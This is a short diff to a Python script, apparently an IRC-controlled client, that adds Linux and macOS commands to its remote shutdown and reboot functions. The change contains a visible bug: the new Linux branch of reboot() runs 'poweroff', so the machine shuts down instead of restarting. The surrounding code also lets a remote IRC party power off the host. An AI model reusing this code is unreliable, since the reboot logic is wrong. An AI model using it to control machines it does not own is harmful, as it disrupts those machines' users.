@@ -208,8 +208,10 @@ def nap(): #shutdown the computer
 	irc.close()
 	if operatingSystem == "windows": #if windows
 		execute("shutdown -s -t 0")
+	elif operatingSystem == "linux":
+		execute("poweroff")
 	elif operatingSystem == "darwin":
-		pass
+		execute("shutdown -h now")
 	else:
 		execute("init 0")
 
@@ -217,8 +219,10 @@ def reboot(): #reboot the computer
 	irc.close()
 	if operatingSystem == "windows": #if windows
 		execute("shutdown -r -t 0")
+	elif operatingSystem == "linux":
+		execute("poweroff")
 	elif operatingSystem == "darwin":
-		pass
+		execute ("shutdown -r now")
 	else:
 		execute("init 6")
 
